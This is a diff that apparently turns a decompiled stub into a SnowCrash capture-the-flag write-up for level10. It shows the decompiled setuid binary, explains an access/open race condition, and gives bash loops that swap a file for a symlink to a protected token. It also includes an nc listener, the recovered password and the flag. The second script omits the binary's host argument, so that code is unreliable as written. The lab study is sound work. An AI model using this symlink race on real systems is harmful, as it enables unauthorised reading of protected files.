@@ -1,8 +1,25 @@
+# level10
 
-/* WARNING: Unknown calling convention */
+- We log as 'level10'
 
+- Two files are located inside the home directory of level10:
+>`-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10`
+>`-rw-------  1 flag10 flag10     26 Mar  5  2016 token`
+
+- The executable file has setuid & setgid bits permissions
+
+- We can see that the executable will be executed as `flag10` if we execute it being `level10`
+
+- Upon execution without arguments the executable prints:
+>`./level10 file host`
+>`        sends file to host if you have access to it`
+
+- Upon execution with `token` as first argument and `test` as second argument, the executable prints:
+>`You don't have access to token`
+
+- Let's reverse this binary on ghidra, here is the main function in C:
+```c
 int main(int argc,char **argv)
-
 {
   char *__cp;
   uint16_t uVar1;
@@ -96,4 +113,47 @@ int main(int argc,char **argv)
   }
   return iVar2;
 }
+```
 
+- We can see that the binary try to access with read rights le file provided as first argument, then try to open it and write it on a socket at port 6969
+
+- This code is vulnerable to race conditions with access and open which means if we pass as parameter a file named `toto` on which i have the rights on i can bypass access check for real ID. I then need to swap the `toto` file with another file name `toto` and the open will affect this new file instead of the first one.
+
+- We first need a small service on port 6969 to listen to the result, let's with nc:
+>`nc -l -k 6969 > /tmp/pwn.log`
+
+- We then need a script that will create a file on which everyont has rights named `/tmp/pwn10` then removes it, create a symlink named `/tmp/pwn10` that points on `/home/user/level10/token` then removes it and do this over and over until i get the right timing with the binary:
+```bash
+#!/bin/bash
+while true
+do
+	touch /tmp/pwn10
+	chmod 777 /tmp/pwn10
+	rm /tmp/pwn10
+	ln -s /home/user/level10/token /tmp/pwn10
+	chmod 777 /tmp/pwn10
+	rm /tmp/pwn10
+done
+```
+
+- We also need a small script that will launch the binary again and again:
+```bash
+#!/bin/bash
+while true
+do
+	/home/user/level10/level10 /tmp/pwn10
+done
+```
+
+- We launch everything and wait a few seconds then let's cat the file removing those `.*( )*.` spamming in the log
+>`level10@SnowCrash:~$ cat /tmp/pwn.log | grep -v ".*( )*."`
+>`woupa2yuojeeaaed06riuj63c`
+
+- This is the password to log to flag10:
+>`level10@SnowCrash:~$ su flag10`
+>`Password: `
+>`Don't forget to launch getflag !`
+>`flag10@SnowCrash:~$ getflag`
+>`Check flag.Here is your token : feulo4b72j7edeahuete3no7c`
+
+- We get the flag: `feulo4b72j7edeahuete3no7c`
